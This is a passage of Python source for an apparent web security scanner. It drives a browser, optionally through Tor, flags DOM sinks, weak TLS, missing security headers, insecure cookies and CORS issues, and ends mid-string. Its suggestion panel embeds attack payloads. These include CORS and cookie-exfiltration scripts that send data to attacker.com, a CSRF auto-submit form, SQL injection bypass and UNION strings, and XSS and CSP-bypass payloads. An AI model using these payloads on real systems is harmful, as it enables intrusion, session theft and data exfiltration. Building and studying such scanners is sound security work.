                    body = request.body.decode('utf-8')
                    data = json.loads(body)
                    action = data.get('action')
                except Exception:
                    action = None
                    
                if action == 'enable_tor':
                    try:
                        # Update selenium wire dictionary (though this usually only works on init)
                        self.driver.proxy = {
                            'http': 'socks5://127.0.0.1:9050',
                            'https': 'socks5://127.0.0.1:9050',
                            'no_proxy': 'localhost,127.0.0.1'
                        }
                        
                        # Dynamically force the underlying mitmproxy backend to use upstream proxy
                        if hasattr(self.driver, 'backend') and hasattr(self.driver.backend, 'master'):
                            self.driver.backend.master.options.update(
                                mode='upstream:socks5://127.0.0.1:9050'
                            )
                        
                        self.tor_enabled = True
                        resp = json.dumps({'status': 'ok'}).encode('utf-8')
                        request.create_response(200, headers={'Content-Type': 'application/json'}, body=resp)
                    except Exception as e:
                        resp = json.dumps({'status': 'error', 'error': str(e)}).encode('utf-8')
                        request.create_response(500, headers={'Content-Type': 'application/json'}, body=resp)
                    return
                    
                if action == 'disable_tor':
                    try:
                        self.driver.proxy = {}
                        
                        if hasattr(self.driver, 'backend') and hasattr(self.driver.backend, 'master'):
                            self.driver.backend.master.options.update(
                                mode='regular'
                            )
                        
                        self.tor_enabled = False
                        resp = json.dumps({'status': 'ok'}).encode('utf-8')
                        request.create_response(200, headers={'Content-Type': 'application/json'}, body=resp)
                    except Exception as e:
                        resp = json.dumps({'status': 'error', 'error': str(e)}).encode('utf-8')
                        request.create_response(500, headers={'Content-Type': 'application/json'}, body=resp)
                    return
                    
                if action == 'check_ip':
                    try:
                        import urllib.request
                        if self.tor_enabled:
                            import subprocess
                            cmd = ['curl', '--socks5-hostname', '127.0.0.1:9050', '-s', 'https://checkip.amazonaws.com']
                            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                            ip = result.stdout.strip()
                            if not ip:
                                ip = "Failed to fetch IP via Tor. Make sure Tor is running on port 9050."
                        else:
                            ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=10).read().decode('utf-8').strip()
                            
                        resp = json.dumps({'status': 'ok', 'ip': ip}).encode('utf-8')
                        request.create_response(200, headers={'Content-Type': 'application/json'}, body=resp)
                    except Exception as e:
                        resp = json.dumps({'status': 'error', 'error': str(e)}).encode('utf-8')
                        request.create_response(500, headers={'Content-Type': 'application/json'}, body=resp)
                    return

        if _SELENIUM_WIRE_AVAILABLE:
            self.driver.request_interceptor = interceptor
        self.driver.get(start_url)
        self.last_seen_url = start_url
        if self.dom_sinks_enabled:
            self._inject_dom_hooks()
        self.running = True

        try:
            self._monitor_loop()
        except KeyboardInterrupt:
            print("\n[*] Live Browsing Session Ended by User.")
        finally:
            self.stop()

    # -- DOM sink instrumentation -------------------------------------------------

    def _inject_dom_hooks(self):
        try:
            self.driver.execute_script(DOM_SINK_HOOK_JS)
        except Exception:
            pass

    def _drain_dom_sinks(self):
        try:
            results = self.driver.execute_script(DOM_SINK_DRAIN_JS)
        except Exception:
            return
        if not results:
            return
        for entry in results:
            kind = entry.get('kind', 'DOM_SINK_UNKNOWN')
            detail = str(entry.get('detail', ''))
            url = entry.get('url', self.current_url)
            stack = entry.get('stack', '')

            severity = 'HIGH' if 'EVAL' in kind or 'FUNCTION' in kind or 'INNERHTML' in kind else 'MEDIUM'
            if kind == 'POSTMESSAGE_NO_ORIGIN_CHECK':
                severity = 'MEDIUM'

            is_dom_xss = False
            reflected_param = ""
            try:
                parsed_url = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed_url.query)
                for param, values in params.items():
                    for v in values:
                        if len(v) > 3 and v in detail:
                            is_dom_xss = True
                            reflected_param = param
                            break
                    if is_dom_xss: break
                
                if not is_dom_xss and parsed_url.fragment and len(parsed_url.fragment) > 3:
                    if parsed_url.fragment in detail:
                        is_dom_xss = True
                        reflected_param = "location.hash"
            except Exception:
                pass

            if is_dom_xss:
                finding = {
                    'url': url,
                    'type': f'CONFIRMED_DOM_XSS_{kind}',
                    'severity': 'CRITICAL',
                    'confidence': '100%',
                    'description': f'DOM XSS CONFIRMED! User input from "{reflected_param}" flows directly into dangerous sink "{kind}".',
                    'remediation': 'Sanitize user input before passing it to DOM sinks like innerHTML or eval().',
                    'match': detail[:200],
                    'context': stack or url,
                    'line': 0,
                    'source': 'RUNTIME_DOM'
                }
            else:
                finding = {
                    'url': url,
                    'type': f'CONFIRMED_RUNTIME_{kind}',
                    'severity': severity,
                    'confidence': '95%',
                    'description': f'Live DOM sink "{kind}" actually fired during manual browsing (not just statically reachable).',
                    'remediation': 'Trace the caller stack to its data source; sanitize/encode before reaching this sink.',
                    'match': detail,
                    'context': stack or url,
                    'line': 0,
                    'source': 'RUNTIME_DOM'
                }

            if finding not in self.analyzer.findings:
                self.analyzer.findings.append(finding)
            self._inject_ui_alert(finding)

    # -- Traffic monitoring --------------------------------------------------------

    def _monitor_loop(self):
        while self.running:
            try:
                # (Tab state and hook injection moved to the end of the loop)

                for request in self.driver.requests:
                    url = request.url

                    if self.har is not None and request.response:
                        req_key = (request.method, url, id(request))
                        if req_key not in self.processed_request_bodies:
                            self.har.add(request)

                    if not self.scope.in_scope(url):
                        continue

                    # --- Request-side analysis (runs once per request, regardless of response) ---
                    req_sig = (request.method, url, hashlib.sha1((request.body or b'')).hexdigest())
                    if req_sig not in self.processed_request_bodies:
                        self.processed_request_bodies.add(req_sig)
                        self._analyze_request(request)

                    if not request.response:
                        continue

                    if url in self.processed_requests:
                        continue

                    # Filter out images, fonts, css
                    if any(ext in url.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.woff', '.woff2', '.ttf', '.css', '.svg', '.ico']):
                        self.processed_requests.add(url)
                        continue

                    # Add to live traffic log if in scope
                    if self.scope.in_scope(url):
                        req_id = id(request)
                        if not any(t.get('id') == req_id for t in getattr(self, 'live_traffic', [])):
                            try:
                                status_code = request.response.status_code if request.response else 0
                            except Exception:
                                status_code = 0
                            
                            display_url = url
                            if len(display_url) > 150:
                                display_url = display_url[:150] + "..."

                            # Try to get raw body if it exists
                            req_body_text = ''
                            if request.body:
                                try:
                                    req_body_text = request.body.decode('utf-8', errors='ignore')
                                except Exception:
                                    req_body_text = '<binary/un-decodable data>'

                            self.live_traffic.append({
                                'id': req_id,
                                'method': request.method,
                                'url': url,  # store full url for repeater
                                'display_url': display_url,
                                'status_code': status_code,
                                'time': datetime.datetime.now().strftime('%H:%M:%S'),
                                'req_headers': dict(request.headers),
                                'req_body': req_body_text
                            })
                            if len(self.live_traffic) > 100:
                                self.live_traffic.pop(0)

                    self.processed_requests.add(url)
                    self._analyze_response(request)

                # Unconditionally inject/update the UI every second to ensure it survives page loads
                # and dynamically updates as the user navigates
                try:
                    try:
                        current = self.driver.current_window_handle
                    except Exception:
                        current = None

                    handles = self.driver.window_handles
                    if not hasattr(self, 'known_handles'):
                        self.known_handles = set(handles)

                    new_handles = set(handles) - self.known_handles
                    
                    if new_handles:
                        # User opened a new tab, switch Selenium's context to it
                        current = list(new_handles)[-1]
                        self.driver.switch_to.window(current)
                        self.known_handles = set(handles)
                    elif current not in handles and handles:
                        # Active window was closed, fallback to last available
                        current = handles[-1]
                        self.driver.switch_to.window(current)
                        self.known_handles = set(handles)
                    elif set(handles) != self.known_handles:
                        # A tab was closed, just update the known set
                        self.known_handles = set(handles)


                    # Re-inject hooks if the page navigated
                    if self.dom_sinks_enabled:
                        try:
                            cur = self.driver.current_url
                        except Exception:
                            cur = self.last_seen_url
                        if cur != self.last_seen_url:
                            self.last_seen_url = cur
                            self.current_url = cur
                            self._inject_dom_hooks()
                        self._drain_dom_sinks()

                    self._inject_ui_alert(None)
                except Exception:
                    pass

                time.sleep(1)  # Prevent CPU thrashing
            except Exception as e:
                # Browser might be closed by user
                if "connection refused" in str(e).lower() or "disconnected" in str(e).lower() or "not reachable" in str(e).lower():
                    print("\n[*] Browser closed. Stopping interception.")
                    break
                time.sleep(1)

    def _check_tls_vulnerabilities(self, url):
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme != 'https':
            return
            
        host = parsed.hostname
        port = parsed.port or 443
        host_key = f"{host}:{port}"
        
        if host_key in self.tls_checked_hosts:
            return
        self.tls_checked_hosts.add(host_key)
        
        try:
            import ssl
            import socket
            # Check for SSLv2/SSLv3 (POODLE)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Use threading to prevent blocking the main interception loop
            import threading
            def do_tls_check():
                try:
                    # In newer Python versions, SSLv2/3 are disabled by default or entirely removed.
                    # We can check the negotiated TLS version and ciphers.
                    with socket.create_connection((host, port), timeout=3) as sock:
                        with context.wrap_socket(sock, server_hostname=host) as ssock:
                            version = ssock.version()
                            cipher = ssock.cipher()
                            
                            if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                                f_tls = {
                                    'url': url,
                                    'method': 'TLS_CHECK',
                                    'status_code': 0,
                                    'type': 'WEAK_TLS_VERSION',
                                    'severity': 'HIGH' if version in ['SSLv2', 'SSLv3'] else 'MEDIUM',
                                    'match': f'Negotiated: {version}',
                                    'description': f'Server supports deprecated/weak protocol {version}. May be vulnerable to POODLE or BEAST.',
                                    'remediation': 'Disable SSLv2, SSLv3, TLSv1.0, and TLSv1.1. Require TLSv1.2 or TLSv1.3.',
                                    'context': f"Host: {host}"
                                }
                                self._inject_ui_alert(f_tls)
                                
                            # Check for weak ciphers (RC4, DES, CBC mode for Lucky13)
                            if cipher:
                                cipher_name = cipher[0]
                                if 'RC4' in cipher_name or 'DES' in cipher_name:
                                    f_cipher = {
                                        'url': url,
                                        'method': 'TLS_CHECK',
                                        'status_code': 0,
                                        'type': 'WEAK_CIPHER_SUITE',
                                        'severity': 'HIGH',
                                        'match': f'Cipher: {cipher_name}',
                                        'description': f'Server negotiated a weak cipher ({cipher_name}). Vulnerable to SWEET32/RC4 biases.',
                                        'remediation': 'Configure server to use strong AEAD ciphers (e.g., AES-GCM, CHACHA20).',
                                        'context': f"Host: {host}"
                                    }
                                    self._inject_ui_alert(f_cipher)
                                elif 'CBC' in cipher_name and version in ['TLSv1.1', 'TLSv1.2']:
                                    f_cbc = {
                                        'url': url,
                                        'method': 'TLS_CHECK',
                                        'status_code': 0,
                                        'type': 'CBC_MAC_VULNERABILITY',
                                        'severity': 'LOW',
                                        'match': f'Cipher: {cipher_name} ({version})',
                                        'description': f'Server negotiated a CBC-mode cipher ({cipher_name}) in TLS. May be vulnerable to Lucky13 or padding oracle attacks if not patched.',
                                        'remediation': 'Prioritize AEAD ciphers (GCM/CCM/CHACHA20) over CBC-mode ciphers.',
                                        'context': f"Host: {host}"
                                    }
                                    self._inject_ui_alert(f_cbc)
                except Exception:
                    pass
                    
            threading.Thread(target=do_tls_check, daemon=True).start()
        except Exception:
            pass

    def _analyze_request(self, request):
        self._check_tls_vulnerabilities(request.url)
        """Runs Analyzer.scan_request against an outgoing request's headers/body."""
        try:
            headers = dict(request.headers)
            body_text = ''
            if request.body:
                try:
                    body_text = request.body.decode('utf-8', errors='ignore')
                except Exception:
                    body_text = ''

            findings = self.analyzer.scan_request(
                request.url, method=request.method, headers=headers, body=body_text or None
            )

            # Also run the generic secret/JWT/entropy pattern set against the body itself —
            # scan() already knows how to find AWS keys, JWTs, etc. in arbitrary text.
            if body_text:
                findings += self.analyzer.scan({f"{request.url} [REQUEST BODY]": body_text}, set())

            for f in findings:
                f.setdefault('method', request.method)
                if f['severity'] in ['CRITICAL', 'HIGH']:
                    print(f"\n[!!!] {f['severity']} REQUEST-SIDE FINDING!")
                    print(f"      Type: {f['type']}")
                    print(f"      {request.method} {request.url}")
                    print(f"      Match: {str(f.get('match',''))[:100]}...\n")
                self._inject_ui_alert(f)
        except Exception:
            pass

    def _analyze_response(self, request):
        url = request.url
        headers = dict(request.response.headers)
        ctype = headers.get('Content-Type', headers.get('content-type', '')).lower()
        status_code = request.response.status_code

        headers_lower = {k.lower(): v for k, v in headers.items()}

        # Check Security Headers Dynamically
        if 'text/html' in ctype:
            missing = []
            if 'content-security-policy' not in headers_lower:
                missing.append("Content-Security-Policy (CSP)")
            if 'strict-transport-security' not in headers_lower and url.startswith('https'):
                missing.append("Strict-Transport-Security (HSTS)")
            if 'x-frame-options' not in headers_lower:
                missing.append("X-Frame-Options (XFO)")
            if 'x-content-type-options' not in headers_lower:
                missing.append("X-Content-Type-Options")

            for m_header in missing:
                f_header = {
                    'url': url,
                    'method': request.method,
                    'status_code': status_code,
                    'type': 'MISSING_SECURITY_HEADER',
                    'severity': 'LOW',
                    'match': f'Missing: {m_header}'
                }
                self._inject_ui_alert(f_header)

        # Check for HTTP Compression (Potential BREACH/CRIME vulnerability)
        if 'content-encoding' in headers_lower:
            encoding = headers_lower['content-encoding'].lower()
            if encoding in ['gzip', 'deflate', 'br']:
                # BREACH targets HTTP compression on responses reflecting user input
                f_compression = {
                    'url': url,
                    'method': request.method,
                    'status_code': status_code,
                    'type': 'HTTP_COMPRESSION_ENABLED',
                    'severity': 'INFO',
                    'match': f'Content-Encoding: {encoding}',
                    'description': f'HTTP compression ({encoding}) is enabled. If this endpoint reflects user input and contains secrets (like CSRF tokens), it may be vulnerable to BREACH/CRIME attacks.',
                    'remediation': 'Disable HTTP compression for endpoints that reflect user data and contain sensitive secrets, or use length-hiding techniques (e.g., XOR masking CSRF tokens).',
                    'context': f"Status: {status_code}"
                }
                self._inject_ui_alert(f_compression)

        # Check Set-Cookie Headers for Vulnerabilities
        if 'set-cookie' in headers_lower:
            cookie_headers = []
            if hasattr(request.response.headers, 'get_all'):
                cookie_headers = request.response.headers.get_all('set-cookie', [])
            else:
                # Fallback to get_list or manually parsing
                raw_headers = getattr(request.response.headers, '_headers', [])
                cookie_headers = [v for k, v in raw_headers if k.lower() == 'set-cookie']
                if not cookie_headers:
                    # Final fallback if _headers isn't available
                    cookie_headers = [headers_lower['set-cookie']]
                
            for cookie_str in cookie_headers:
                # Don't split by comma here as Set-Cookie strings contain commas in dates (e.g., Expires=Wed, 21 Oct 2015 07:28:00 GMT)
                # Instead, parse each string individually
                cookie_lower = cookie_str.lower()
                cookie_name = cookie_str.split('=')[0].strip() if '=' in cookie_str else "Unknown"
                missing_flags = []
                
                # We usually don't care if a tracking cookie lacks HttpOnly, but let's flag it anyway with LOW severity if it doesn't look sensitive
                is_sensitive = any(s in cookie_lower for s in ['session', 'token', 'auth', 'sess', 'id', 'user'])
                severity = 'MEDIUM' if is_sensitive else 'LOW'

                # HttpOnly Check
                if 'httponly' not in cookie_lower:
                    missing_flags.append('HttpOnly')
                
                # Secure Check
                if 'secure' not in cookie_lower and url.startswith('https'):
                    missing_flags.append('Secure')
                
                # SameSite Check
                if 'samesite' not in cookie_lower:
                    missing_flags.append('SameSite (Missing)')
                elif 'samesite=none' in cookie_lower and 'secure' not in cookie_lower:
                    missing_flags.append('SameSite=None without Secure')
                    
                if missing_flags:
                    f_cookie = {
                        'url': url,
                        'method': request.method,
                        'status_code': status_code,
                        'type': 'INSECURE_COOKIE',
                        'severity': severity,
                        'match': f'Cookie: {cookie_name}',
                        'description': f'Cookie "{cookie_name}" is missing security flags: {", ".join(missing_flags)}.',
                        'remediation': 'Set HttpOnly, Secure, and SameSite attributes on sensitive cookies.',
                        'context': cookie_str[:100]
                    }
                    self._inject_ui_alert(f_cookie)

        # CORS Misconfiguration Check
        if 'access-control-allow-origin' in headers_lower:
            acao = headers_lower['access-control-allow-origin']
            if acao == '*':
                f_cors = {
                    'url': url,
                    'method': request.method,
                    'status_code': status_code,
                    'type': 'CORS_WILDCARD_ORIGIN',
                    'severity': 'LOW', # Wildcard with credentials=true would be HIGH, but we can't always know without the acac header
                    'match': 'Access-Control-Allow-Origin: *',
                    'description': 'CORS policy allows access from any origin (*). This could be dangerous if combined with Access-Control-Allow-Credentials: true or if the endpoint exposes sensitive data.',
                    'remediation': 'Restrict Access-Control-Allow-Origin to trusted domains only.',
                    'context': f"Status: {status_code}"
                }
                self._inject_ui_alert(f_cors)
            elif 'access-control-allow-credentials' in headers_lower and headers_lower['access-control-allow-credentials'].lower() == 'true':
                # Check if it reflected a domain
                if acao != '*' and 'http' in acao:
                     f_cors = {
                        'url': url,
                        'method': request.method,
                        'status_code': status_code,
                        'type': 'POTENTIAL_CORS_MISCONFIG',
                        'severity': 'MEDIUM',
                        'match': f'ACAO: {acao} | ACAC: true',
                        'description': 'CORS allows credentials and specifies an origin. Verify if the origin is dynamically reflected from the request Origin header without validation.',
                        'remediation': 'Ensure the reflected origin is validated against a strict allowlist before granting access.',
                        'context': f"Status: {status_code}"
                    }
                     self._inject_ui_alert(f_cors)


        # Try to get response body via selenium-wire
        try:
            import gzip
            from io import BytesIO
            body_bytes = request.response.body

            # Handle gzip decoding if necessary
            if request.response.headers.get('Content-Encoding') == 'gzip':
                body_bytes = gzip.GzipFile(fileobj=BytesIO(body_bytes)).read()

            body = body_bytes.decode('utf-8', errors='ignore')

            if body:
                print(f"    [Intercepted] {request.method} {url} -> {status_code}")
                # We need to pass headers to scan so it can pass them to component_checker
                findings = self.analyzer.scan({url: body}, set(), headers=headers)

                for f in findings:
                    f.setdefault('method', request.method)
                    f.setdefault('status_code', status_code)
                    if f['severity'] in ['CRITICAL', 'HIGH']:
                        print(f"\n[!!!] {f['severity']} FINDING DYNAMICALLY DISCOVERED!")
                        print(f"      Type: {f['type']}")
                        print(f"      URL: {f['url']}")
                        print(f"      Match: {f['match'][:100]}...\n")

                    self._inject_ui_alert(f)

        except Exception:
            # Body decoding might fail on binary files not caught by filter
            pass

    def _inject_ui_alert(self, finding=None):
        if finding:
            # Deduplicate by URL and TYPE to prevent UI spam
            is_duplicate = False
            for existing in self.live_findings:
                if existing.get('url') == finding.get('url') and existing.get('type') == finding.get('type'):
                    is_duplicate = True
                    break
            
            if not is_duplicate:
                self.live_findings.append(finding)
                try:
                    new_hyps = self.correlator.ingest(finding)
                    for h in new_hyps:
                        self.live_hypotheses.append(h.to_finding_dict())
                except Exception as e:
                    pass

        sev_rank = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        sorted_hyps = sorted(self.live_hypotheses, key=lambda h: sev_rank.get(h.get('severity', 'INFO'), 9))

        suggestions_html = """
        <div style="font-family:'Inter', sans-serif; padding:10px;">
            <div style="text-align:center; margin-bottom:15px;">
                <h3 style="color:#00ffcc; margin:0; font-size:18px; text-transform:uppercase; letter-spacing:2px; text-shadow: 0 0 12px rgba(0,255,204,0.6);">⚡ VulcanX AI Intelligence</h3>
                <div style="font-size:11px; color:#888;">Next-Generation Automated Attack Path Analysis & Heuristics</div>
            </div>
        """

        if sorted_hyps:
            suggestions_html += '<div style="margin-bottom:20px;"><div style="font-size:12px; color:#fff; border-bottom:1px solid #444; padding-bottom:4px; margin-bottom:10px;"><strong>🎯 AI-Correlated Active Hypotheses</strong></div>'
            for h in sorted_hyps:
                severity = h['severity'].replace("'", "\'")
                sev_color = "red"
                if severity == "MEDIUM": sev_color = "#ff9900"
                elif severity == "LOW": sev_color = "#ffff00"
                elif severity == "HIGH": sev_color = "#ff3333"

                title = h.get('description', '').replace("'", "\\'").replace("`", "\\`").replace("$", "\\$")
                cwe = h.get('context', '').replace("'", "\\'")
                conf = h.get('confidence', 'N/A')
                url_s = h.get('url', '').replace("'", "\\'").replace("`", "\\`")
                if len(url_s) > 70: url_s = url_s[:70] + "..."
                remediation = h.get('remediation', '').replace("'", "\\'").replace("`", "\\`").replace("$", "\\$")

                suggestions_html += f"""
                <details style="margin-bottom:8px; background:rgba(20,40,30,0.8); border:1px solid #005544; border-radius:6px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);">
                    <summary style="cursor:pointer; outline:none; padding:10px; font-weight:bold; display:flex; align-items:center; gap:8px;">
                        <span style="background:{sev_color}; color:#000; padding:2px 6px; border-radius:3px; font-size:9px; text-shadow:none;">{severity}</span>
                        <span style="color:#00ffcc; font-size:12px; flex:1;">{title}</span>
                        <span style="color:#888;font-size:10px;">Conf: {conf}%</span>
                    </summary>
                    <div style="padding:10px; border-top:1px solid #005544; font-size:11px; color:#ccc; background:rgba(10,20,15,0.8);">
                        <strong style="color:#aaa;">Context Vector:</strong> {cwe}<br>
                        <strong style="color:#aaa;">Vulnerable Sink:</strong> <span style="color:#4da6ff;word-break:break-all;">{url_s}</span><br><br>
                        <strong style="color:#00ffcc;">🧠 AI Exploitation Synthesis:</strong><br>
                        <div style="margin-top:4px; padding:8px; background:#0a1a15; border-left:3px solid #00ffcc; border-radius:3px; font-family:monospace; color:#00ff99;">{remediation}</div>
                    </div>
                </details>
                """
            suggestions_html += '</div>'
        else:
            suggestions_html += '<div style="color:#00aa88; text-align:center; padding:20px; font-style:italic; background:rgba(0,50,40,0.3); border:1px dashed #005544; border-radius:6px;">No dynamic correlations mapped yet. Continue exercising application state...</div>'

        # Generate Context-Aware AI Suggestions Based on Current Findings
        specific_suggestions = {}

        for f in self.live_findings:
            t = f.get('type', '').upper()
            
            # --- CORS ---
            if 'CORS_WILDCARD_ORIGIN' in t:
                specific_suggestions['CORS_WILDCARD'] = {
                    'title': '🚪 CORS Wildcard Abuse (*)',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: *`.<br>- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers). Useful for exfiltrating unauthenticated public/internal API data.<br>- <strong>Exploit Code (Host on Attacker Server):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;script&gt;\n  fetch("TARGET_URL")\n    .then(r =&gt; r.text())\n    .then(d =&gt; fetch("https://attacker.com/log?d=" + btoa(d)));\n&lt;/script&gt;</pre>'
                }
            elif 'CORS_NULL_ORIGIN' in t:
                specific_suggestions['CORS_NULL'] = {
                    'title': '🚪 CORS Null Origin Abuse (null)',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: null`.<br>- <strong>Constraint:</strong> Allows authenticated requests if `Access-Control-Allow-Credentials: true` is set.<br>- <strong>Exploit Code (Data URI Iframe Sandbox):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" \\n  src="data:text/html,&lt;script&gt;\\n  var req = new XMLHttpRequest();\\n  req.onload = req.onerror = function() {{ \\n    fetch(\\\'https://attacker.com/log?d=\\\' + btoa(this.responseText));\\n  }};\\n  req.open(\\\'GET\\\', \\\'TARGET_URL\\\', true);\\n  req.withCredentials = true;\\n  req.send();\\n  &lt;/script&gt;"&gt;\\n&lt;/iframe&gt;</pre>'
                }

            # --- DOM Sinks ---
            elif 'DOM_SINK_INNERHTML' in t:
                specific_suggestions['INNERHTML'] = {
                    'title': '🌐 DOM XSS: innerHTML & outerHTML',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser.<br>- <strong>Constraint:</strong> `<script>` tags will NOT execute when injected via innerHTML. You must use element attributes/events.<br>- <strong>Standard Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;svg/onload=alert(1)&gt;</code><br>- <strong>WAF Evasion / Filter Bypasses:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;body onload=alert(1)&gt;</code> (If injecting near `<body>`)'
                }
            elif 'DOM_SINK_EVAL' in t or 'DOM_SINK_FUNCTION' in t or 'SETTIMEOUT' in t:
                specific_suggestions['EVAL'] = {
                    'title': '🌐 DOM XSS: JS Execution Contexts (eval / setTimeout)',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> Data is passed directly to the JS runtime.<br>- <strong>Constraint:</strong> You need to break out of the current JS syntax (e.g., strings, function calls) without breaking the engine parser.<br>- <strong>String Breakouts:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">\");alert(1);//</code><br><code style="color:#66ffcc; background:#111; padding:2px;">\'-alert(1)-\'</code><br>- <strong>Direct Execution (if no surrounding quotes):</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">alert(1)</code>'
                }

            # --- Cookies ---
            elif 'INSECURE_COOKIE_HTTPONLY' in t:
                specific_suggestions['HTTPONLY'] = {
                    'title': '🔑 Session Hijacking via Missing HttpOnly',
                    'color': '#aa55ff',
                    'text': '- <strong>Vulnerability:</strong> High-value cookie (e.g. session_id) lacks HttpOnly flag.<br>- <strong>Attack Vector:</strong> If you find an XSS vulnerability anywhere on this domain, you can steal this cookie via JS.<br>- <strong>XSS Exfiltration Payload:</strong><br><code style="color:#d499ff; background:#111; padding:2px;">fetch("https://attacker.com/steal?c=" + btoa(document.cookie))</code>'
                }
            elif 'INSECURE_COOKIE_SECURE' in t:
                specific_suggestions['SECURE_COOKIE'] = {
                    'title': '🔑 MitM Cookie Interception (Missing Secure)',
                    'color': '#aa55ff',
                    'text': '- <strong>Vulnerability:</strong> Cookie lacks the `Secure` flag.<br>- <strong>Attack Vector:</strong> If the user is on public Wi-Fi or subjected to network sniffing, and they make ANY plaintext HTTP request to the domain (even a redirect), the browser will leak this cookie in plaintext.<br>- <strong>Exploitation:</strong> Use tools like Bettercap or Wireshark to intercept the unencrypted HTTP traffic.'
                }
            elif 'INSECURE_COOKIE_SAMESITE' in t:
                specific_suggestions['SAMESITE'] = {
                    'title': '🔑 Cross-Site Request Forgery (Missing SameSite)',
                    'color': '#aa55ff',
                    'text': '- <strong>Vulnerability:</strong> Cookie lacks `SameSite=Lax` or `Strict`.<br>- <strong>Attack Vector:</strong> The browser will attach this session cookie to cross-site POST/GET requests initiated from an attacker site.<br>- <strong>Exploit Code (Host on Attacker Site):</strong><br><pre style="background:#111; color:#d499ff; padding:6px; border-radius:3px; overflow-x:auto;">&lt;form action="TARGET_STATE_CHANGING_URL" method="POST"&gt;\n  &lt;input type="hidden" name="email" value="attacker@email.com"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>'
                }

            # --- Injections ---
            elif 'SQLI' in t or 'INJECTION' in t:
                specific_suggestions['SQLI'] = {
                    'title': '🔥 Database Injection & Exfiltration',
                    'color': '#ff3333',
                    'text': '- <strong>Authentication Bypass:</strong><br><code style="color:#ff6666; background:#111; padding:2px;">admin\' --</code><br><code style="color:#ff6666; background:#111; padding:2px;">\' OR 1=1--</code><br>- <strong>Time-Based Blind (Confirmation):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND SLEEP(5)--</code> (MySQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\'; WAITFOR DELAY \'0:0:5\'--</code> (MSSQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--</code><br>- <strong>UNION-Based Exfiltration (Find Column Count First):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">\' ORDER BY 1--</code> (Increment until error)<br><code style="color:#ff6666; background:#111; padding:2px;">\' UNION SELECT null, null, database(), user(), @@version--</code>'
                }

            # --- CSP ---
            elif 'CSP_MISSING' in t:
                specific_suggestions['CSP_MISSING'] = {
                    'title': '🛡️ Missing Content Security Policy (No XSS Protection)',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> No CSP header is present.<br>- <strong>Attack Vector:</strong> The browser will execute any inline script or load any external script. Any XSS vulnerability found is fully exploitable.<br>- <strong>Strategy:</strong> Focus heavily on finding Reflected or Stored XSS, as there is no secondary defense layer.'
                }
            elif 'CSP_UNSAFE_INLINE' in t or 'UNSAFE_INLINE' in t:
                specific_suggestions['CSP_INLINE'] = {
                    'title': '🛡️ CSP Bypass (unsafe-inline)',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> CSP allows `unsafe-inline` in script-src.<br>- <strong>Attack Vector:</strong> You don\\\'t need to host an external script. You can execute JS directly in the DOM.<br>- <strong>Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">javascript:alert(1)</code> (in `<a>` tags)'
                }
            elif 'CSP_UNSAFE_EVAL' in t or 'UNSAFE_EVAL' in t:
                specific_suggestions['CSP_EVAL'] = {
                    'title': '🛡️ CSP Bypass (unsafe-eval)',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> CSP allows `unsafe-eval` in script-src.<br>- <strong>Attack Vector:</strong> String-to-code execution is allowed.<br>- <strong>Payloads:</strong> Look for sinks like `eval()`, `setTimeout()`, or `setInterval()`.<br><code style="color:#66ffcc; background:#111; padding:2px;">setTimeout(\'alert(1)\')</code><br><code style="color:#66ffcc; background:#111; padding:2px;">[].constructor.constructor("alert(1)")()</code>'
                }
            elif 'CSP_WILDCARD' in t:
                specific_suggestions['CSP_WILDCARD'] = {
                    'title': '🛡️ CSP Bypass (Wildcard/Whitelisted Domains)',
                    'color': '#00ffaa',
                    'text': '- <strong>Vulnerability:</strong> CSP allows `*` or broadly whitelists domains (e.g. `https://*.google.com`).<br>- <strong>Attack Vector:</strong> Host your payload on the whitelisted domain (e.g., using Google Cloud Storage, AWS S3, or JSONP endpoints on the allowed CDN).<br>- <strong>JSONP Payload Example:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;script src="https://whitelisted-domain.com/api?callback=alert"&gt;&lt;/script&gt;</code>'
                }

        if not specific_suggestions:
            suggestions_html += """
